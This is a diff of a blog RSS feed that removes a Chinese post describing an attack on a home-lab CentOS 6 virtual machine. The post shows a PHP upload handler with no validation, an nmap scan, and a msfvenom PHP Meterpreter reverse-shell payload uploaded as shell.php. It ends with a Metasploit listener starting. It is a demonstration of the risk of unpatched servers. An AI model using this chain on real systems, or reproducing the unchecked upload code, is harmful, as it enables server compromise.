@@ -6,379 +6,9 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>2019-2021 | WeepingDogel via CC-BY-NC 4.0</copyright>
-    <lastBuildDate>Tue, 15 Jun 2021 09:01:29 +0800</lastBuildDate>
+    <lastBuildDate>Sun, 16 May 2021 18:21:05 +0800</lastBuildDate>
     
         <atom:link href="https://weepingdogel.github.io/index.xml" rel="self" type="application/rss+xml" />
-    
-    
-    
-        <item>
-        <title>攻击 CentOS6 虚拟机</title>
-        <link>https://weepingdogel.github.io/posts/2020-09-26/</link>
-        <pubDate>Sat, 26 Sep 2020 13:14:18 +0800</pubDate>
-        
-        <guid>https://weepingdogel.github.io/posts/2020-09-26/</guid>
-        <description>WeepingDogel&#39;s Blog https://weepingdogel.github.io/posts/2020-09-26/ -&lt;blockquote&gt;
-&lt;p&gt;虽然存在渗透过程，但是本篇主题不是渗透，请理性阅读。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id=&#34;序&#34;&gt;序&lt;/h1&gt;
-&lt;p&gt;最近总听到一些声音。&lt;/p&gt;
-&lt;p&gt;一些关于软件更新的、不同的声音。&lt;/p&gt;
-&lt;p&gt;一边说：在某些情况下，更新不好，会带来不必要的工作量，甚至重写&lt;/p&gt;
-&lt;p&gt;另一边说：持续不断的更新才能带来更好的体验&lt;/p&gt;
-&lt;p&gt;我不知道哪一边是对的，但有点好奇&lt;/p&gt;
-&lt;p&gt;我好奇如果不更新会怎样，所以我做了这件事：用虚拟机模拟一个商业公司的服务器，系统为 CentOS 6，尝试使用一些工具试着去攻击。&lt;/p&gt;
-&lt;p&gt;只是想模拟一家公司在 2020 年使用 CentOS 6.0 被黑客盯上了会怎么样。&lt;/p&gt;
-&lt;h1 id=&#34;模拟环境&#34;&gt;模拟环境&lt;/h1&gt;
-&lt;blockquote&gt;
-&lt;p&gt;攻击者平台: Arch Linux&lt;/p&gt;
-&lt;p&gt;IP: 192.168.0.109&lt;/p&gt;
-&lt;p&gt;受害平台: CentOS 6.1 on VirtualBox&lt;/p&gt;
-&lt;p&gt;IP: 192.168.0.116&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;strong&gt;假如&lt;/strong&gt;这是一家由非技术人员领导技术人员的公司，很长一段时间没有更新过开发时使用的软件（包括开发机、服务器的操作系统）&lt;/p&gt;
-&lt;p&gt;我们将这个虚拟机想象为他们的服务器，然后进行一些攻击测试。&lt;/p&gt;
-&lt;p&gt;由于这家公司的管理层是非技术人员，因此服务器的软件不仅版本老旧，且缺乏防御措施。&lt;/p&gt;
-&lt;p&gt;外加公司有点不尽人意的工时，程序员们都以“完成任务”的摸鱼态度工作，导致后端 PHP 写成了这样&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;lt;?&lt;/span&gt;php
-&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#bb60d5&#34;&gt;$_FILES&lt;/span&gt;[&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;0&lt;/span&gt;)
-{
-    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;错误：&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;$_FILES&lt;/span&gt;[&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
-}
-&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;else&lt;/span&gt;
-{
-    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;上传文件名: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;$_FILES&lt;/span&gt;[&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
-    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;文件类型: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;$_FILES&lt;/span&gt;[&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
-    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;文件大小: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt; (&lt;span style=&#34;color:#bb60d5&#34;&gt;$_FILES&lt;/span&gt;[&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#666&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;1024&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34; kB&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
-    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;文件临时存储的位置: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;$_FILES&lt;/span&gt;[&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;tmp_name&amp;#34;&lt;/span&gt;];
-    move_uploaded_file(&lt;span style=&#34;color:#bb60d5&#34;&gt;$_FILES&lt;/span&gt;[&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;tmp_name&amp;#34;&lt;/span&gt;], &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;upload/&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;$_FILES&lt;/span&gt;[&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;]);
-    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;文件存储在: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;upload/&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;$_FILES&lt;/span&gt;[&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;];
-}
-&lt;span style=&#34;color:#007020&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;&#34;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;blockquote&gt;
-&lt;p&gt;由于条件有限，只能模拟到这个程度，但我个人认为&lt;del&gt;足以进行抽象测试了&lt;/del&gt;(逃&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id=&#34;攻击过程&#34;&gt;攻击过程&lt;/h1&gt;
-&lt;p&gt;总有人喜欢搞破坏，一名黑客对服务器进行了扫描&amp;hellip;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo nmap -O -v 192.168.0.116
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;结果是这样的&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Nmap scan report for 192.168.0.116
-Host is up (0.00028s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 2.6.X|3.X
-OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
-OS details: Linux 2.6.32 - 3.10
-Uptime guess: 49.708 days (since Sat Aug  8 02:56:12 2020)
-Network Distance: 1 hop
-TCP Sequence Prediction: Difficulty=261 (Good luck!)
-IP ID Sequence Generation: All zeros
-
-Read data files from: /usr/bin/../share/nmap
-OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
-           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;他惊讶地发现内核版本居然才 &lt;code&gt;2.6.32&lt;/code&gt;，这样的事他还是第一次见。&lt;/p&gt;
-&lt;p&gt;除此之外，开放的端口有 SSH 、 HTTP ，这给了他很好的机会。&lt;/p&gt;
-&lt;p&gt;他试图访问了网站，在网站上发现了一个文件上传点。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2020-09-26_21-18.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;抱着试试看的态度，用 msf 生成了一个 payload&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ msfvenom -p php/meterpreter/reverse_tcp &lt;span style=&#34;color:#bb60d5&#34;&gt;LHOST&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;192.168.0.109 &lt;span style=&#34;color:#bb60d5&#34;&gt;LPORT&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#40a070&#34;&gt;4444&lt;/span&gt; -o shell.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;选择了文件，点击上传惊奇地发现，不止上传成功，还被告知了位置
-&lt;img src=&#34;https://weepingdogel.github.io/img/2020-09-26_21-22.png&#34; alt=&#34;&#34;&gt;
-于是他启动了 &lt;code&gt;msfconsole&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ msfconsole
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;并使用  &lt;code&gt;exploit/multi/handler&lt;/code&gt; 这个模块&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;msf5 &amp;gt; use exploit/multi/handler 
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;依次设置好参数&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;msf5 exploit(multi/handler) &amp;gt; set LHOST 192.168.0.109
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;msf5 exploit(multi/handler) &amp;gt; set LPORT 4444
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;set payload php/meterpreter/reverse_tcp
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;最后一步就是运行模块了，&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;msf5 exploit(multi/handler) &amp;gt; run
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;然后 msf 开始监听。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;
-[*] Started reverse TCP handler on 192.168.0.109:4444 
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
